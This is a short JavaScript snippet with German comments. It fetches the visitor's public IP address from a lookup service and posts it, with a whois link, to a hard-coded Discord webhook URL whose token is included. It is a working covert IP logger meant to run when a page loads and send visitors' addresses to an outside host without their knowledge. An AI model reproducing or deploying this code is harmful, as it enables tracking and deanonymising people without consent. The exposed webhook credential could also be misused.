// IP-Adresse abrufen
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const webhookUrl = "https://discord.com/api/webhooks/1420852251009880197/mkab3By7IuKgbgvhvF5IhSHkTVBepc4T-L-uPZKHon9H1LKN-WK5IpK0UVUHF4OYeUS0";

    // Nachricht formatieren (nur IP)
    const payload = {
      content: `📌 Neue IP-Adresse: <https://whatismyipaddress.com/ip/${ip}>`
    };

    // An Discord senden
    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(err => {
      console.error("Fehler beim Senden an Discord:", err);
    });
  })
  .catch(err => {
    console.error("Fehler beim Abrufen der IP-Adresse:", err);
  });
